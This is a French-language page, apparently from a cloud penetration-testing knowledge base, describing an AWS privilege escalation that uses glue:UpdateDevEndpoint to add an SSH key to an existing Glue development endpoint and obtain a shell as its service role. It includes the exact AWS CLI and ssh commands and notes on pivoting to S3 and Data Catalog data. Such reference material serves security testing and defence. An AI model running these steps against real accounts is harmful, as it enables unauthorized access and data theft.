---
title: "UpdateDevEndpoint : pousser une clé SSH vers un dev endpoint Glue"
description: "glue:UpdateDevEndpoint pour pousser une clé publique SSH vers un development endpoint Glue exécutant un rôle privilégié et obtenir un shell."
keywords:
  - UpdateDevEndpoint
  - Glue
  - dev endpoint
  - clé SSH
  - rôle de service
---

# UpdateDevEndpoint

Un development endpoint Glue est une instance de longue durée qui s'exécute avec un **rôle de service** Glue. `glue:UpdateDevEndpoint` vous permet d'ajouter une clé publique SSH à un endpoint existant, puis de vous y connecter en SSH et d'opérer en tant que ce rôle, sans aucun `PassRole`.

## Ajouter votre clé et se connecter

```bash
aws glue update-dev-endpoint --endpoint-name <endpoint> \
  --add-public-keys "$(cat ~/.ssh/id_ed25519.pub)"
# then SSH to the endpoint's public address as the glue user
ssh glue@<endpoint-address>
#   aws sts get-caller-identity   (runs as the Glue role)
```

## Notes d'exploitation

- L'endpoint doit déjà exister ; c'est la variante « mise à jour » du chemin de création [Glue PassRole](../pass-role/glue.md).
- Les rôles de service Glue portent fréquemment un large accès S3 et Data Catalog, de sorte que le shell constitue une solide position d'accès aux données et de pivot.

## Outils

- **AWS CLI** (`glue update-dev-endpoint`).
- **Pacu** : modules Glue.

## Références

- [Rhino Security Labs: AWS privilege escalation (Glue dev endpoint)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [HackTricks Cloud: AWS Glue](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-glue-enum.html)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
